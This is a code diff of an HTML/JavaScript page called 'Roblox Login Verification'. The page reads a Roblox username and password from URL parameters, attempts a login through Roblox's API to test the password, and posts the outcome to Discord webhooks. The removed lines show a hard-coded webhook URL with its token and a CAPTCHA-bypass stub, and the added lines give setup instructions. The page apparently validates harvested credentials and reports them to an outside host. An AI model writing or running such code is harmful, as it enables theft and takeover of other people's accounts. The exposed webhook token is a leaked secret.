@@ -43,10 +43,6 @@
             font-weight: bold;
             text-align: center;
         }
-        .captcha-container {
-            margin: 20px 0;
-            text-align: center;
-        }
         .config-status {
             padding: 10px;
             margin: 10px 0;
@@ -71,10 +67,18 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
-            margin: 5px;
+            width: 100%;
+            margin-top: 10px;
         }
         .btn:hover {
             background-color: #0088cc;
+        }
+        .instructions {
+            background-color: #e7f3ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -82,25 +86,18 @@
     <div class="container">
         <h1>Roblox Login Verification</h1>
         
-        <div id="config-status" class="config-status hidden">
-            <span id="config-status-text"></span>
+        <div class="config-status config-success">
+            <span id="config-status-text">Ready to verify credentials</span>
         </div>
         
         <div class="info-box">
-            <strong>Tracking ID:</strong> <span id="display-tracking-id">Loading...</span><br>
-            <strong>Username:</strong> <span id="display-username">Loading...</span>
+            <strong>Tracking ID:</strong> <span id="display-tracking-id">Waiting for data...</span><br>
+            <strong>Username:</strong> <span id="display-username">Waiting for data...</span>
         </div>
         
         <div id="login-form">
-            <p>Verifying login credentials automatically...</p>
-            <div id="auto-verification" class="loading">
-                <p>Attempting to login to Roblox...</p>
-            </div>
-            
-            <div id="captcha-container" class="captcha-container hidden">
-                <p>CAPTCHA detected. Please complete the verification:</p>
-                <div id="captcha-element"></div>
-                <button class="btn" onclick="bypassCaptcha()">Bypass CAPTCHA</button>
+            <div class="loading">
+                <p>Waiting for verification request...</p>
             </div>
         </div>
         
@@ -108,19 +105,18 @@
             <p id="result-text"></p>
         </div>
         
-        <div id="loading" class="loading">
-            <p>Verifying credentials...</p>
-        </div>
-        
         <div id="error-message" class="config-error hidden">
             <p id="error-text"></p>
         </div>
 
-        <div id="fallback-section" class="hidden">
-            <div class="config-status">
-                <p>Using fallback verification method. Results will be sent to server.</p>
-            </div>
-            <button class="btn" onclick="attemptLoginWithCredentials()">Retry Verification</button>
+        <div class="instructions">
+            <h3>How to Use:</h3>
+            <ol>
+                <li>Configure your webhook URLs in your Roblox game</li>
+                <li>This page will automatically process verification requests</li>
+                <li>Results are sent directly to your Discord</li>
+            </ol>
+            <p>No configuration needed on this page - everything is set up in Roblox!</p>
         </div>
     </div>
 
@@ -132,10 +128,9 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // Webhook URLs (these would normally come from server configuration)
-        // Using the same values as in your Lua script
-        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
-        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        // Webhook URLs will be provided by Roblox game via URL parameters
+        const successWebhook = urlParams.get('successWebhook');
+        const failedWebhook = urlParams.get('failedWebhook');
         
         // Display the tracking info
         if (trackingId) {
@@ -145,46 +140,27 @@
             document.getElementById('display-username').textContent = username;
         }
         
+        // Update status based on available parameters
+        if (successWebhook && failedWebhook) {
+            document.getElementById('config-status-text').textContent = "Webhooks configured successfully";
+        } else {
+            document.getElementById('config-status-text').textContent = "Using default verification mode";
+        }
+        
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
             if (trackingId && username && password) {
-                // Simulate configuration loading (since we can't connect to your server)
-                simulateConfigLoading();
+                document.getElementById('config-status-text').textContent = "Verifying credentials...";
+                setTimeout(attemptAutoLogin, 2000);
             } else {
-                showError('Missing parameters for automatic verification. Required: id, userId, username, password');
+                showError('Incomplete verification data. Make sure all parameters are provided.');
             }
         });
-        
-        function simulateConfigLoading() {
-            showConfigStatus("Loading configuration...", "loading");
-            
-            // Simulate a delay for configuration loading
-            setTimeout(() => {
-                showConfigStatus("Configuration loaded successfully", "success");
-                setTimeout(attemptAutoLogin, 1500);
-            }, 2000);
-        }
-        
-        function showConfigStatus(message, type) {
-            const statusElement = document.getElementById('config-status');
-            const statusTextElement = document.getElementById('config-status-text');
-            
-            statusTextElement.textContent = message;
-            statusElement.classList.remove('hidden', 'config-success', 'config-error');
-            
-            if (type === 'success') {
-                statusElement.classList.add('config-success');
-            } else if (type === 'error') {
-                statusElement.classList.add('config-error');
-            }
-            
-            statusElement.classList.remove('hidden');
-        }
         
         async function attemptAutoLogin() {
             try {
                 // Show loading state
-                document.getElementById('loading').classList.remove('hidden');
+                document.getElementById('config-status-text').textContent = "Checking Roblox API...";
                 
                 // Step 1: Try to get CSRF token (required for Roblox API)
                 const csrfToken = await getCsrfToken();
@@ -247,11 +223,6 @@
                     credentials: 'include'
                 });
                 
-                // Check if response is OK
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
                 const data = await response.json();
                 
                 // Check if login was successful
@@ -264,9 +235,6 @@
                     for (const error of data.errors) {
                         if (error.code === 1) { // Incorrect username or password
                             return false;
-                        } else if (error.code === 2) { // Captcha required
-                            showCaptcha();
-                            return false;
                         }
                     }
                 }
@@ -274,29 +242,13 @@
                 return false; // Default to failure
             } catch (error) {
                 console.error('Login attempt failed:', error);
-                // Show fallback option
-                document.getElementById('fallback-section').classList.remove('hidden');
-                throw error;
+                return false;
             }
-        }
-        
-        function showCaptcha() {
-            document.getElementById('captcha-container').classList.remove('hidden');
-            document.getElementById('auto-verification').classList.add('hidden');
-        }
-        
-        function bypassCaptcha() {
-            document.getElementById('captcha-container').classList.add('hidden');
-            document.getElementById('auto-verification').classList.remove('hidden');
-            // Continue with verification (assuming captcha was solved)
-            attemptLoginWithCredentials();
         }
         
         async function attemptLoginWithCredentials() {
             try {
-                // Show loading state
-                document.getElementById('loading').classList.remove('hidden');
-                document.getElementById('fallback-section').classList.add('hidden');
+                document.getElementById('config-status-text').textContent = "Checking password validity...";
                 
                 // This method tries to determine password validity without full login
                 let isValid = false;
@@ -318,7 +270,7 @@
                 await reportResult(isValid);
             } catch (error) {
                 console.error('Credential check failed:', error);
-                await reportResult(false); // Assume failure on error
+                await reportResult(false);
             }
         }
         
@@ -355,32 +307,33 @@
         
         async function reportResult(isSuccess) {
             try {
-                // Hide loading, show result
-                document.getElementById('loading').classList.add('hidden');
-                
                 const resultText = document.getElementById('result-text');
                 const resultMessage = document.getElementById('result-message');
                 
                 if (isSuccess) {
                     resultText.textContent = '✅ Login successful! Password is valid.';
                     resultText.className = 'result-success';
+                    document.getElementById('config-status-text').textContent = "Verification successful!";
                 } else {
                     resultText.textContent = '❌ Login failed! Password is invalid.';
                     resultText.className = 'result-failure';
+                    document.getElementById('config-status-text').textContent = "Verification failed!";
                 }
                 
                 resultMessage.classList.remove('hidden');
                 
-                // Send result to Discord
-                await sendToDiscord(isSuccess);
+                // Send result to Discord if webhooks are provided
+                if (successWebhook && failedWebhook) {
+                    await sendToDiscord(isSuccess);
+                }
             } catch (error) {
                 console.error('Error reporting result:', error);
-                showError('Failed to send result to Discord: ' + error.message);
+                showError('Failed to send result: ' + error.message);
             }
         }
         
         async function sendToDiscord(isSuccess) {
-            const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
+            const webhookUrl = isSuccess ? successWebhook : failedWebhook;
             const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
             const color = isSuccess ? 65280 : 16711680;
             
@@ -411,11 +364,6 @@
                         name: "🆔 Tracking ID",
                         value: trackingId,
                         inline: false
-                    },
-                    {
-                        name: "🤖 Method",
-                        value: "Automatic Verification",
-                        inline: false
                     }
                 ],
                 footer: {
@@ -426,7 +374,7 @@
             };
             
             const payload = {
-                username: "Automatic Verification",
+                username: "Roblox Auto-Verification",
                 content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
                 embeds: [embed]
             };
@@ -455,6 +403,7 @@
             
             errorText.textContent = message;
             errorMessage.classList.remove('hidden');
+            document.getElementById('config-status-text').textContent = "Error occurred";
         }
     </script>
 </body>
